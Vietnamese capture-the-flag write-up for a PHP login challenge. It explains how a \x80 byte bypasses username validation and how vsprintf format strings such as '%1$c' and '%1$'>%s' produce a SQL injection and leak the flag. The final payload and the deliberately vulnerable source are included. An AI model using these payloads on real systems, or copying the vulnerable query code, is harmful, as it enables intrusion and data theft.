Đặc điểm có thể nhận ra dựa vào code có thể là :
```code
 $message = vsprintf($greeting, [date('Y-m-d H:i:s'), getenv('FLAG')]);
```

# Bước 1: Bypass kiểm tra username với  `\x80`
- Username phải bắt đầu bằng "admin"
- Thêm byte` \x80` sau `"admin"` để:
    - Vượt qua kiểm tra: `admin\x80anything` được chấp nhận
    - Ẩn payload phía sau khỏi validation 
# Bước 2: SQL Injection bằng format string `%1$c`
- Payload: `admin\x80%1$c;-- ...`
- Password: `668` tức là khi pass được hash sẽ thành (SHA1 = 34c66477...)
- Cơ chế:
```code!
Password "668" 
    → SHA1: "34c66477..." 
    → %1$c lấy arg đầu: "34c66477..."
    → Type juggling: (int)"34c66477..." = 34
    → Cast to char: 34 % 256 = 34
    → ASCII 34 = '"'
```
- Kết quả: `%1$c` biến thành `"` → tạo SQL injection:
```code
  WHERE username = "admin\x80";-- ..." AND password = "..."
```
# Bước 3: Leak flag với format string ẩn `%1$'>%s`

**Vấn đề**: Cần thêm `%s` để lấy flag, nhưng nó gây blow-up ở query SQL sớm hơn , tức nếu đưa thêm `%c` vào trực tiếp cấu query thì nó sẽ gây lỗi đang trong câu truy vấn check username và passwd.
-> Phải làm sao đấy để che dấu `%s` đi rồi sau khi qua câu query check passwd nó mới hiện ra 

- Tại sao lại phải thêm `%s`
```code
$htmlsafe_username = htmlspecialchars($username,
                                      ENT_COMPAT | ENT_SUBSTITUTE);
$greeting = $username === "admin" 
    ? "Hello $htmlsafe_username, the server time is %s and the flag is %s"
    : "Hello $htmlsafe_username, the server time is %s";

$message = vsprintf($greeting, [date('Y-m-d H:i:s'), getenv('FLAG')]);
```
- Ta không có cách nào để bypass strict `=== admin` 
- Do vậy auto rơi vào `:`
- Tự đó muốn lấy `flag` phải inject thêm 1 biến nữa 

**Giải pháp**: Dùng `%1$'>%s` - một format string "2 mặt"


#### Trước khi mã hóa HTML (trong SQL query):
```
%1$'>%s
└─────┘└─ Không phải %s!
   │
   └─ %1$'>% = literal '%' với padding '>'
       s = ký tự rác thông thường
```
→ Không gây blow-up ✓

#### Sau khi mã hóa HTML (`>` → `&gt;`):
```
%1$'&gt;%s
└───────┘└──┘
    │      │
    │      └─ %s thật sự!
    └─ %1$'&g = format specifier khác
```
```code

Args: [date, FLAG]
      ↓     ↓
      0     1  ← Vị trí trong mảng

Format string: "... %1$c;-- %1$'&gt;%s, the server time is %s"
                    │         │       │                      │
                    │         │       │                      └─ %s (template)
                    │         │       └─ %s Lấy arg[0]=Time ✓            Sequential
                    │         └─ %1$'&g                                  Lấy arg[1]=FLAG ✓
                    │            Positional 
                    │            Lấy arg[0]
                    └─ %1$c
                       Positional
                       Lấy arg[0]
```
Cursor timeline:
- Start: cursor = 0
- `%1$c`: positional → cursor vẫn 0
- `%1$'&g`: positional → cursor vẫn 0
- `%s` (payload): sequential → lấy `arg[0]`, cursor++ = 1 ✓
- `%s` (template): sequential → lấy `arg[1]`=FLAG ✓

## Payload cuối cùng
```
Username: admin\x80%1$c;-- %1$'>%s
Password: 668
```

-> PWN

```php
<?php
function mysql_fquery($mysqli, $query, $params) {
  return mysqli_query($mysqli, vsprintf($query, $params));
}

if (isset($_POST['username']) && isset($_POST['password'])) {
  $mysqli = mysqli_connect(getenv('DB_HOST'),
                           'challuser',
                           'challpass',
                           'challenge');
  $username = strtr($_POST['username'], ['"' => '\\"', '\\' => '\\\\']);
  $password = sha1($_POST['password']);

  $res = mysql_fquery($mysqli,
                      'SELECT * FROM users WHERE username = "%s"',
                      [$username]);
  if (!mysqli_fetch_assoc($res)) {
     $message = "Username not found.";
     goto fail;
  }
  $res = mysql_fquery($mysqli,
                      'SELECT * FROM users WHERE username = "'.$username.'" ' .
                          'AND password = "%s"',
                      [$password]);
  if (!mysqli_fetch_assoc($res)) {
     $message = "Invalid password.";
     goto fail;
  }
  $htmlsafe_username = htmlspecialchars($username, ENT_COMPAT | ENT_SUBSTITUTE);
  $greeting = $username === "admin" 
      ? "Hello $htmlsafe_username, the server time is %s and the flag is %s"
      : "Hello $htmlsafe_username, the server time is %s";

  $message = vsprintf($greeting, [date('Y-m-d H:i:s'), getenv('FLAG')]);
  
  fail:
}
?>

<!--- SNIP - boring HTML --->
```
